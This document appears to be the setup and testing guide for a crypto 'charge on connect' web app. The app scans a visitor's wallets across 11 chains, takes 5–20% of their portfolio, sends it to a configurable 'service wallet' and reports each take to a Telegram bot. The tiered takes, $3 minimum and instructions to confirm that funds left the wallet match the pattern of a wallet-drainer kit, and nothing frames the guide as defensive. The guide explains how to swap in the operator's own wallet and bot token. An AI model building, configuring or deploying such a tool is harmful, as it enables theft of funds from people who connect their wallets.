SYSTEM CONFIGURATION OPTIONS

THREE CRITICAL SETTINGS:

1. SERVICE WALLET ADDRESS
   Location: apps/web/.env.local
   Variable: NEXT_PUBLIC_SERVICE_WALLET
   Format: 0x followed by 40 hex characters
   Default: 0x1fC618a5B0AAFfC876b72288D71f3E80918c590f
   
   Where to change:
   - Easy: Edit .env.local (recommended)
   - Hard: Edit chargeOnConnect.ts default parameter

2. CHARGE PERCENTAGES
   Location: apps/web/src/utils/portfolioValue.ts
   Function: getChargePercentageByPortfolioValue()
   Current tiers: 5%, 8%, 12%, 15%, 18%, 20%
   
   Can be customized:
   - Flat rate (e.g., 15% for all users)
   - Progressive (higher balance = lower %)
   - Regressive (higher balance = higher %)
   - Custom tiers with any boundaries

3. MINIMUM BALANCE REQUIREMENT
   Location: apps/web/src/utils/chargeOnConnect.ts
   Variable: MINIMUM_PORTFOLIO_BALANCE
   Default: 3 (USD)
   Current: Only charges users with $3+ portfolio

================================================================================
HOW TO CHANGE SETTINGS
================================================================================

QUICK REFERENCE:

Change Service Wallet:
  1. Open apps/web/.env.local
  2. Find: NEXT_PUBLIC_SERVICE_WALLET=0x...
  3. Replace with your wallet: NEXT_PUBLIC_SERVICE_WALLET=0xYourAddress
  4. Save and refresh browser - changes instant

Change Charge %:
  1. Open apps/web/src/utils/portfolioValue.ts
  2. Find: getChargePercentageByPortfolioValue() function
  3. Change percentages in the if statements
  4. Save and refresh browser - changes instant

Change Minimum Balance:
  1. Open apps/web/src/utils/chargeOnConnect.ts
  2. Find: export const MINIMUM_PORTFOLIO_BALANCE = 3
  3. Change 3 to your desired amount
  4. Save and refresh browser - changes instant

Setup Telegram:
  1. Get token from @BotFather on Telegram
  2. Get chat ID from @userinfobot on Telegram
  3. Add to apps/web/.env.local:
     TELEGRAM_BOT_TOKEN=your_token_here
     TELEGRAM_CHAT_ID=your_chat_id_here
  4. Save and test

TESTING INSTRUCTIONS
================================================================================

LOCAL TESTING (http://localhost:3000):

1. Start dev server:
   cd apps/web
   npm run dev

2. Open browser:
   http://localhost:3000

3. Get test tokens:
   - Have tokens on 2-3 different chains
   - Need minimum $3 total
   - Recommended: USDT on BSC, USDC on Ethereum, etc.

4. Connect wallet:
   - Click "Connect Wallet"
   - Select your wallet (MetaMask recommended)
   - Approve connection

5. System will automatically:
   - Scan all 11 chains
   - Detect your tokens
   - Calculate total portfolio
   - Show wallet transaction prompts
   - Execute charges on each chain

6. Check results:
   - Verify funds left your wallet
   - Check Telegram for notification
   - Verify funds arrived at service wallet
   - Review transaction hashes on chain explorer

VERIFYING CHARGES:

1. Check service wallet:
   - Go to blockchain explorer (Etherscan, PolygonScan, etc.)
   - Search for service wallet address
   - Look for incoming transactions

2. Check Telegram:
   - Should receive notification with all details
   - Includes portfolio value, charge %, amount, and hashes

3. Check user wallet:
   - Balance should decrease by charge amount
   - May take 30-120 seconds to confirm on chain
